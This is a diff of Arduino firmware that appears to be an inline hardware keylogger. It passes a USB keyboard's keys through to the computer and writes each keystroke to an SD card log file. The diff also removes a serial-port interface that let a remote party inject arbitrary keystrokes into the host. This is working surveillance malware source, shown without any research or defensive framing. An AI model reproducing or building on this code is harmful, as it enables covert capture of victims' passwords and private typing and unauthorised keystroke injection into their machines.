@@ -65,10 +65,11 @@ class KbdRptParser : public KeyboardReportParser {
 };
 
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
-  Keyboard.rawrelease(key, 0);
   SetModifiersArd();
-  key_modifier = key|modifiersard,HEX;
-  SDlog = SD.open("log.txt", FILE_WRITE);
+  Keyboard.rawrelease(key, 0);
+  
+  key_modifier = key|modifiersard;
+  SDlog = SD.open("logs.txt", FILE_WRITE);
 
   for (int i = 0; i < 256; i++) {
     if(pgm_read_byte(_asciimap + i) == key_modifier){
@@ -82,51 +83,6 @@ void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
 void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) { 
   SetModifiers();
   Keyboard.rawpress(key, modifiers);
-}
-
-char ProcessCommand() {
-  
-  // Release (example: release)
-  if(cmd.startsWith("release")) {
-    Keyboard.releaseAll();
-  }
-
-  // Println (example: println Hello World)
-  else if(cmd.startsWith("println ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    Keyboard.println(Command + 8);
-  }
-
-  // Print (example: print Hello World)
-  else if(cmd.startsWith("print ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    Keyboard.print(Command + 6);
-  }
-
-  // Press (example: press 131) 131 = KEY_LEFT_GUI
-  else if(cmd.startsWith("press ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    tmp_key = Command + 6;
-    int keytmp = tmp_key.toInt();
-    Keyboard.press(keytmp);
-    delay(100);
-  }
-  
-  // RawPress (example: rawpress 131) 131 = KEY_LEFT_GUI
-  else if(cmd.startsWith("rawpress ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    tmp_key = Command + 9;
-    int keytmp = tmp_key.toInt();
-    Keyboard.press(keytmp);
-    delay(100);
-    Keyboard.releaseAll();
-  }
-
-  // Delay (example: delay 2000)
-  else if(cmd.startsWith("delay ")) {
-    cmd.toCharArray(Command, cmd.length() + 1);
-    delay(atoi(Command + 6));
-  }
 }
 
 void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
@@ -178,7 +134,7 @@ void setup() {
   SD.begin(5);
   
   #if !defined(__MIPSEL__)
-    while (!Serial1); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
+    while (!Serial1);
   #endif
 
   if (Usb.Init() == -1)
@@ -188,11 +144,4 @@ void setup() {
 
 void loop() {
   Usb.Task();
-
-  while (Serial1.available()) {
-    cmd = Serial1.readStringUntil('\n');
-    delay(500);
-    ProcessCommand();
-    cmd ="";
-  }
 }
